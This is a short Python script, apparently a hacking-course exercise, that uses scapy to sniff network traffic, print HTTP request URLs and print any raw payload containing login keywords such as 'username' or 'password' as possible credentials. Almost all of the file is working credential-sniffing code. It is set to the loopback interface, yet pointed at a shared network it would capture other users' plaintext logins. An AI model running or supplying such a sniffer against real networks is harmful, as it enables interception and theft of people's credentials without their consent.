import scapy.all as scapy
from scapy.layers import http

my_ethernet_interface = "Realtek PCIe GbE Family Controller"
my_loopback_interface = "Loopback Pseudo-Interface 1"

def sniff(interface):
    scapy.sniff(iface = interface, store = False, prn = process_packet)

def get_url(packet):
    return (packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path).decode("utf-8")

def process_packet(packet):
    print(f"sniffing packet: {packet}")
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(f"HTTP url is: {url}")
        cred = get_credentials(packet)
        if cred:
            print(f"Possible login information: {cred}")

keywords = ("username", "user", "uname", "login", "password", "pass", "signin", "signup", "name")

def get_credentials(packet):
    if packet.haslayer(scapy.Raw):
        payload = packet[scapy.Raw].load.decode("utf-8")
        for keyword in keywords:
            if keyword in payload.lower():
                return payload

sniff(my_loopback_interface)